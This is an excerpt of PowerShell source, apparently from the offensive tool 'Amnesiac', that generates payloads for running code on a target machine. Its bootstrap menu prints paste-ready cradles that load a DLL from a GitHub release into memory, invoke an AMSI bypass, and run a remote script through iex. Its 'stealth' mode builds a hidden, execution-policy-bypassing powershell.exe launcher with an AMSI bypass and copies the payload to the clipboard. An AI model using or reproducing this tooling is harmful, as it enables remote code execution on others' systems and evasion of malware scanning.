...
function Amnesiac {
	...
	while ($true) {
		...
		if ($choice -eq 'bootstrap') {
			...
			Write-Host ""
			$_ghRel  = "https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al"
			$_ghPs1  = "https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1"
			$_gh3l1  = "`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('$_ghRel/$_alNs.dll'))"
			$_gh3l2  = if ($_alByp -and $_alPar) { "`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null)" } else { "(run Build.ps1 first — `$_alByp/`$_alPar not populated)" }
			$_gh3l3  = "iex (New-Object Net.WebClient).DownloadString('$_ghPs1');Amnesiac"
			Write-Host " ─────────────────────────────────────────────────────" -ForegroundColor DarkGray
			Write-Host " [*] Load with local serve (operator on network):" -ForegroundColor Cyan
			Write-Host "     $_load" -ForegroundColor White
			Write-Host ""
			Write-Host " [*] Load from GitHub — no local server (target needs outbound HTTPS to github.com):" -ForegroundColor Cyan
			Write-Host "     Paste 3 lines — option [5] bypass, no PS AMSI reflection, names randomized:" -ForegroundColor Yellow
			Write-Host "     $_gh3l1" -ForegroundColor White
			Write-Host "     $_gh3l2" -ForegroundColor White
			Write-Host "     $_gh3l3" -ForegroundColor White
			Write-Host ""
			Write-Host "     GitHub PS-only fallback (weaker — run option [1] bypass first, then):" -ForegroundColor DarkYellow
			Write-Host "     iex (New-Object Net.WebClient).DownloadString('$_ghPs1');Amnesiac" -ForegroundColor Gray
			Write-Host ""
			continue
		}
...
#>
	...
	if(!$HidePayload){
		...
		elseif($chosenFormat -eq 'stealth'){
			...
			Write-Output " [1] Inline PS -- paste into existing PS session"
			Write-Output " $($built.InlinePS)"
			Write-Output ""
			if ($wrapped.Length -gt 8000) {
				Write-Output " [2] Full command -- launcher: $($global:PayloadConfig.Launcher)  [!] $($wrapped.Length) chars — exceeds cmd.exe 8191-char limit; use [1] if pasting into cmd.exe"
			} else {
...
#>
	...
	elseif($chosenFormat -eq 'stealth'){
		...
		$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
		# Pre-build serve-based download cradle: write InlinePS to operator disk so serve can host it.
		# The full -enc b64 of InlinePS is ~10k chars — exceeds cmd.exe's 8191-char limit,
		# silently truncating the payload. The download cradle is ~120 chars, well within the limit.
		...
		# [2] Full command: if -enc base64 exceeds cmd.exe 8191-char limit, substitute download cradle
		$_cmdCradle      = "powershell.exe -nop -ep bypass -w hidden -c `"$_rdpAmsi;$_rdpCradle`""
		$_fullCmdTooLong = $wrapped.Length -gt 8000
		$_fullCmdPayload = if ($_fullCmdTooLong) { $_cmdCradle } else { $wrapped }
		$_fullCmdNote    = if ($_fullCmdTooLong) {
			"download cradle (serve required — -enc is $($wrapped.Length) chars, exceeds cmd.exe 8191-char limit)"
		} else {
			"launcher: $($global:PayloadConfig.Launcher)"
		}
		Write-Output " [1] Inline PS -- paste into existing PS session on target"
		Write-Output " $($built.InlinePS)"
		Write-Output ""
		Write-Output " [2] Full command -- $_fullCmdNote"
		Write-Output " $_fullCmdPayload"
		Write-Output ""
		# Write pipe file to disk for serve-based delivery (sharprdp, dcom, direct CMD terminal).
		...
		Write-Host " Copy to clipboard [1] Inline PS  [2] Full command: " -Foreground yellow -NoNewline
		$_sc = (Read-Host).Trim()
		$_clipPayload = if ($_sc -eq '2') { $_fullCmdPayload } else { $built.InlinePS }
	}
	if ($_clipPayload) {
		Set-Clipboard -Value $_clipPayload
		Write-Host " [*] Payload copied to clipboard" -Foreground green
